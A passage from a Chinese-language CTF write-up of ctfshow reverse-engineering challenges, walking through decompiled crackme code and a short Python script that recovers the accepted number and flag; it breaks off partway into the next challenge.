qword_140004618<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>qword_140004618 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入正确的数字:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">sub_140001080</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lld\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>sub_1400010E0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>根据这个结构，可以猜到 <code>sub_140001080</code>  为得到输入的数字， <code>sub_1400010E0</code>  为验证输入的数字</p>\n<p>继续跟进</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">sub_1400010E0</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> __int64 a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// er9</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int8 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// cl</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Fh] [rbp-3F9h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">char</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-3F8h] BYREF</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token operator\">++</span>v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token operator\">++</span>v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>a4890572163qwe<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">26</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">/</span> <span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      v5 <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span>v3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      v3 <span class=\"token operator\">/=</span> <span class=\"token number\">26</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      a2 <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v6 <span class=\"token operator\">=</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v8 <span class=\"token operator\">+</span> v6<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">sub_1400011E0</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">^</span> <span class=\"token number\">7u</span><span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token function\">sub_140001220</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>其中 v3 为输入的数字， <code>-26 * (v3 / 26)</code>  为 <code>v3 % 26</code>  的值， <code>v6</code>  即为模值对应的字符，并进行存储</p>\n<p>由此下面的 <code>while( v7 )</code>  中， <code>v8</code>  即为由模值取出来的各字符，将其与 7 异或后进入 sub_1400011E0，跟进，可能是将取出来的字符串存入开头申请的内存空间里，用于后面的比较。<s>不懂是什么功能，</s></p>\n<p>跟进 <code>sub_140001220</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __noreturn <span class=\"token function\">sub_140001220</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// er8</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// cl</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v0 <span class=\"token operator\">=</span> qword_140004620<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    v4 <span class=\"token operator\">=</span> v1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> aV4pY59<span class=\"token punctuation\">[</span>v2 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      v4 <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    qword_140004620 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v5 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    v7 <span class=\"token operator\">=</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    v0 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">!=</span> aV4pY59<span class=\"token punctuation\">[</span>v2<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    qword_140004620 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      v2 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span>i64<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      v1 <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">14</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">goto</span> LABEL_11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v7 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>LABEL_11<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v7 <span class=\"token operator\">==</span> <span class=\"token number\">14</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">sub_1400012E0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token function\">sub_1400012B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>大致为每次两位字符与已知的 a <code>V4pY59</code>  进行比较 (这里有个应该注意的点，v2 初始值为 0，第一位比较的索引为 - 1，查看汇编代码，aV4pY59 前一位地址对应的字符为 <code>/</code> )</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5Creverse%5C%E9%80%86%E5%90%914_1.jpg\" alt=\"\"></p>\n<p>因此，最终比较的字符串为 <code>/..v4p$$!&gt;Y59-</code></p>\n<p>当相等后，会返回认证成功</p>\n<p>由此，对此验证过程进行逆向</p>\n<p>首先获取由输入值得到的字符串，因为异或后比较的字符串为 <code>/..v4p$$!&gt;Y59-</code> , 根据异或的性质，再进行一次异或即可得到由输入值得到的字符串，即</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>aV4pY59 <span class=\"token operator\">=</span> <span class=\"token string\">\"/..v4p$$!&gt;Y59-\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> aV4pY59<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token builtin\">cmp</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><code>cmp</code>  即为所求</p>\n<p>cmp 的每一位字符在 <code>a4890572163qwe</code>  中的索引值即为每次求得的模值 (或者可以看作 26 进制的每一位)</p>\n<p>故还原代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>a4890572163qwe <span class=\"token operator\">=</span> <span class=\"token string\">\")(*&amp;^%489$!057@#&gt;&lt;:2163qwe\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    index <span class=\"token operator\">=</span> a4890572163qwe<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">*</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> index</pre></td></tr></tbody></table></figure><p>综上，完整代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>aV4pY59 <span class=\"token operator\">=</span> <span class=\"token string\">\"/..v4p$$!&gt;Y59-\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a4890572163qwe <span class=\"token operator\">=</span> <span class=\"token string\">\")(*&amp;^%489$!057@#&gt;&lt;:2163qwe\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> aV4pY59<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">cmp</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    index <span class=\"token operator\">=</span> a4890572163qwe<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">*</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> index</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>得到 <code>2484524302484524302</code></p>\n<p>打开程序，输入该数字，返回 <code>认证成功</code> ，因此 flag 为 <code>flag{2484524302484524302}</code></p>\n<h2 id=\"逆向5\"><a class=\"anchor\" href=\"#逆向5\">#</a> 逆向 5</h2>\n<p>打开，反汇编</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">sub_4020B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">sub_4015BD</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>dword_405020 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">MessageBoxA</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>跟进 <code>sub_4015BD</code></p>\n<p>得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>__stdcall <span class=\"token function\">sub_4015BD</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>retaddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp+4h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>Str<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> Str<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> sub_401520<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    retaddr <span class=\"token operator\">=</span> sub_401520<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>跟进 sub_401520</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">sub_401520</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FARPROC H<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+14h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  HMODULE hModule<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+18h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  size_t i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+1Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  hModule <span class=\"token operator\">=</span> <span class=\"token function\">LoadLibraryA</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.dll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  H <span class=\"token operator\">=</span> <span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span>hModule<span class=\"token punctuation\">,</span> <span class=\"token string\">\"H\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>__cdecl <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>H<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_40163E</span><span class=\"token punctuation\">(</span>i<span class=\"token 